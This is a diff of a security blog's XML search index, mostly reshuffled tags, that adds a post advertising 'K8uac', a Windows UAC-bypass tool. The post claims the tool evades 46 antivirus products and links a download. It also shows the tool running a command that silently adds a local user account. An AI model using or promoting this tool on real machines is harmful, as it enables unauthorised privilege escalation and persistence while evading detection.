-<p><img alt data-original="https://k8gege.org/k8img/posts/k8uac.png"></p>
-<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Exp</tag>
-        <tag>BypassUAC</tag>
       </tags>
   </entry>
   <entry>
@@ -9422,8 +9401,8 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Weblogic</tag>
       </tags>
@@ -9449,9 +9428,9 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
         <category>工具</category>
       </categories>
       <tags>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-        <tag>Exp</tag>
         <tag>IIS</tag>
       </tags>
   </entry>
@@ -9521,15 +9500,38 @@ from pprint import pprint
         <category>源码</category>
         <category>主机发现</category>
         <category>内网渗透</category>
-        <category>嗅探</category>
         <category>编程</category>
         <category>信息收集</category>
+        <category>嗅探</category>
         <category>Python</category>
       </categories>
       <tags>
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
+    <url>/p/41e1c61c.html</url>
+    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
+<p>工具: k8uac<br>编译: VC++</p>
+<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
+<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
+<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
+<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
+<p>示例如下:</p>
+<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/k8uac.png"></p>
+<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>BypassUAC</tag>
       </tags>
   </entry>
   <entry>
@@ -10712,8 +10714,8 @@ setTimeout("window.location.href='http://k8gege.org/p/Ladon.html'",800);
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
 </search>
